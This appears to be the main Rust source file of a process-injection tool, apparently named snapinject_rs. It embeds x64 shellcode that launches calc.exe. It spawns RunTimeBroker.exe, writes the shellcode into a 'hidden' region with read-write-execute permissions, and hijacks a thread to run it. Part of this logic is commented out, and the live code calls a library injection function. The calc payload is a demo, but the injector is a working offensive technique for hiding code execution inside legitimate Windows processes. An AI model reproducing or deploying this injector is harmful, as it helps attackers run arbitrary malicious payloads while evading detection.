//use noldr::{get_dll_address, get_teb};
//use winapi::um::processthreadsapi::CreateProcessA;
//use winapi::um::processthreadsapi::PROCESS_INFORMATION;
//use winapi::um::processthreadsapi::STARTUPINFOA;
//use winapi::um::winbase::{DEBUG_PROCESS, DETACHED_PROCESS, NORMAL_PRIORITY_CLASS};

mod func;

//shellcode to pop calc.exe
pub const SHELL_CODE: [u8; 276] = [
    0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51,
    0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52,
    0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
    0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed,
    0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88,
    0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44,
    0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48,
    0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1,
    0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44,
    0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49,
    0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a,
    0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41,
    0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b,
    0x6f, 0x87, 0xff, 0xd5, 0xbb, 0xf0, 0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
    0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb, 0x47,
    0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c, 0x63, 0x2e,
    0x65, 0x78, 0x65, 0x00,
];

fn main() {
    /*
    //set the process name to RunTimeBroker.exe for testing
    let process_name = "RunTimeBroker.exe".to_string();
    //format the process path
    let process_path = if !process_name.contains('\\') {
        format!("C:\\Windows\\System32\\{}", process_name)
    } else {
        process_name
    };

    //create the startup info and process info structs
    let mut si: STARTUPINFOA = unsafe { std::mem::zeroed() };
    let mut pi: PROCESS_INFORMATION = unsafe { std::mem::zeroed() };
    si.cb = std::mem::size_of::<STARTUPINFOA>() as u32;

    //create the process
    let success = unsafe {
        CreateProcessA(
            std::ptr::null(),
            process_path.as_ptr() as *mut i8,
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            1,
            NORMAL_PRIORITY_CLASS | DETACHED_PROCESS | DEBUG_PROCESS,
            std::ptr::null_mut(),
            std::ptr::null(),
            &mut si,
            &mut pi,
        )
    };

    //check if the process was created successfully
    if success == 0 {
        eprintln!("Failed to create process: {}", unsafe {
            winapi::um::errhandlingapi::GetLastError()
        });
        std::process::exit(1);
    }

    println!("Process created successfully");
    println!("Process Handle: 0x{:x}", pi.hProcess as usize);
    println!("Thread Handle: 0x{:x}", pi.hThread as usize);
    println!("Process ID: {}", pi.dwProcessId);
    println!("Thread ID: {}", pi.dwThreadId);

    //print msg "Press enter to snapshot the process"
    println!("Press enter to snapshot the process");
    let mut input = String::new();
    std::io::stdin().read_line(&mut input).unwrap();

    let process_handle = pi.hProcess;

    /*

    // Capture just the snapshot handle value
    let snapshot_handle = match func::capture_process_snapshot(process_handle) {
        Ok(handle) => handle,
        Err(e) => {
            eprintln!("Failed to capture snapshot: {}", e);
            return;
        }
    };

    println!("Snapshot handle: 0x{:x}", &snapshot_handle as *const _ as usize);

    // Create a walk marker handle
    let mut walker = HPSSWALK::default();
    let pss_success = unsafe { PssWalkMarkerCreate(None, &mut walker) };

    if pss_success != ERROR_SUCCESS {
        eprintln!("[!] PssWalkMarkerCreate failed: Win32 error {}", pss_success);
    } else {
        println!("PssWalkMarkerCreate succeeded");
    }

    //print the walk marker handle
    println!("Walk Marker Handle: 0x{:?}", walker);
    */

    let shellcode_size = SHELL_CODE.len();
    let shellcode_location =
        func::get_hidden_injection_address(process_handle, shellcode_size).unwrap();

    //println!("Shellcode location: 0x{:x}", shellcode_location as usize);

    // Add this code to inject the shellcode
    if !func::inject_and_rwx(process_handle, shellcode_location, &SHELL_CODE) {
        eprintln!("Failed to inject shellcode");
        std::process::exit(1);
    }

    println!(
        "Shellcode injected successfully at: 0x{:x}",
        shellcode_location as usize
    );

    // ... after shellcode injection ...

    println!("Press enter to hijack the thread");
    let mut input = String::new();
    std::io::stdin().read_line(&mut input).unwrap();

    // Hijack the thread to execute the shellcode
    if !func::snap_thread_hijack(
        pi.dwProcessId,
        pi.hThread,
        pi.dwThreadId,
        process_handle,
        Some(shellcode_location),
        None,
    ){
        eprintln!("Failed to hijack thread");
        std::process::exit(1);
    }

    println!("Thread hijacked successfully");
    */

    //snapinject_rs::inject_calc_shellcode("RunTimeBroker.exe").unwrap();

    let process_name = "RunTimeBroker.exe".to_string();

    snapinject_rs::inject_shellcode(&process_name, &SHELL_CODE).unwrap();
}
